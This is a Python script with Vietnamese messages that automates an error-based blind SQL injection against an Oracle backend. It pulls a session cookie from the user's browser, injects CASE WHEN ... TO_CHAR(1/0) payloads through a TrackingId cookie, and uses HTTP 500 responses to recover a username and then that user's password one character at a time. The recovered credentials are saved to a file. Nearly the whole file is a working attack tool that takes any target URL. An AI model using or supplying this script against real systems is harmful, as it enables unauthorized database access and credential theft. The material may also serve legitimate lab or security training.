import sys
import requests
import browser_cookie3
from datetime import datetime

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"

def log_success(username, password):
    with open("result.txt", "a", encoding="utf-8") as f:
        f.write(f"\n[{datetime.now()}] ✅ Username: {username} | Password: {password}\n")
    print(f"\n[✓] Đã lưu kết quả vào file result.txt")

def log_error(error_message):
    with open("error.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] ❌ Lỗi: {error_message}\n")

def get_session_cookie(domain):
    try:
        cj = browser_cookie3.chrome(domain_name=domain)
    except:
        cj = browser_cookie3.firefox(domain_name=domain)

    for cookie in cj:
        if "sess" in cookie.name.lower():
            print(f"[✓] Found session cookie: {cookie.name} = {cookie.value}")
            return cookie.name, cookie.value
    raise Exception("❌ Không tìm thấy session cookie!")

def is_condition_true(payload_tracking_id, cookie_name, session_value, target_url):
    cookies = {
        "TrackingId": payload_tracking_id,
        cookie_name: session_value
    }
    try:
        response = requests.get(target_url, cookies=cookies)
        return response.status_code == 500
    except Exception as e:
        print("Lỗi khi gửi request:", e)
        return False

def brute_force_username(cookie_name, session_value, target_url, max_len=20):
    print("\n[*] Brute-force username...")
    username = ""
    for i in range(1, max_len + 1):
        found = False
        for ch in CHARSET:
            payload = f"xyz'||(SELECT CASE WHEN SUBSTR(username,{i},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'"
            if is_condition_true(payload, cookie_name, session_value, target_url):
                username += ch
                print(f"[+] Ký tự {i}: {ch} → {username}")
                found = True
                break
        if not found:
            print("[*] Không tìm thấy thêm ký tự.")
            break
    return username

def find_password_length(username, cookie_name, session_value, target_url, max_len=50):
    print(f"\n[*] Tìm độ dài mật khẩu của user: {username}")
    for length in range(1, max_len + 1):
        payload = f"xyz'||(SELECT CASE WHEN LENGTH(password)>{length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{username}')||'"
        if not is_condition_true(payload, cookie_name, session_value, target_url):
            print(f"[✓] Độ dài mật khẩu: {length}")
            return length
    raise Exception("❌ Không tìm được độ dài mật khẩu!")

def brute_force_password(username, length, cookie_name, session_value, target_url):
    print("\n[*] Brute-force mật khẩu...")
    password = ""
    for i in range(1, length + 1):
        for ch in CHARSET:
            payload = f"xyz'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{username}')||'"
            if is_condition_true(payload, cookie_name, session_value, target_url):
                password += ch
                print(f"[+] Ký tự {i}: {ch} → {password}")
                break
    return password

# --------- MAIN ---------
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("⚠️ Dùng: python blind_sqli_save.py <FULL_URL>")
        sys.exit(1)

    BASE_URL = sys.argv[1].strip().rstrip('/')
    TARGET_URL = BASE_URL
    DOMAIN = BASE_URL.split("//")[-1].split("/")[0]

    try:
        print(f"[*] Lấy session cookie từ trình duyệt: {DOMAIN}")
        cookie_name, session_value = get_session_cookie(DOMAIN)

        username = brute_force_username(cookie_name, session_value, TARGET_URL)
        if not username:
            raise Exception("❌ Không tìm được username!")

        pw_length = find_password_length(username, cookie_name, session_value, TARGET_URL)
        password = brute_force_password(username, pw_length, cookie_name, session_value, TARGET_URL)

        print(f"\n🎉 THÀNH CÔNG! Username: {username} | Password: {password}")
        log_success(username, password)

    except Exception as e:
        print(f"❌ Lỗi: {e}")
        log_error(str(e))
